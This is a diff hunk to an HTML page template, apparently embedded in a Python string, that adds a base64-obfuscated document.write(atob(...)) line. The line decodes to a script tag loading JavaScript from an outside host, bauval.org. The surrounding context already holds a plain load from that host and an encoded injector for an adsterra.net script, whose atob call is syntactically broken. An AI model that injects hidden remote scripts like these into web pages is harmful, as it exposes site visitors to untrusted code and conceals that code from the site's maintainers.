@@ -300,6 +300,7 @@ window.onload = () => {
 <script data-cfasync="false" src="https://bauval.org/14/0da00ca253e63df3d2cc05d14ea88894"></script>
 
 <script>document.write(atob(PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPihmdW5jdGlvbigpe3ZhciBzPWRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNjcmlwdCIpO3Muc3JjPSJodHRwczovL3BsMjQxNTQ5NDQuYWRzdGVycmEubmV0L2E1NC9lNy9jNi9hNTRlN2M2NmY3ZDBiOTU3NGI5M2I4YzRkMmY4M2Q3LmpzIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHMpO30pKCk7PC9zY3JpcHQ+)),</script>
+<script>document.write(atob("PHNjcmlwdCBkYXRhLWNmYXN5bmM9ImZhbHNlIiBzcmM9Imh0dHBzOi8vYmF1dmFsLm9yZy8xNC8wZGEwMGNhMjUzZTYzZGYzZDJjYzA1ZDE0ZWE4ODg5NCI+PC9zY3JpcHQ+"));</script>
 </body>
 </html>
 """
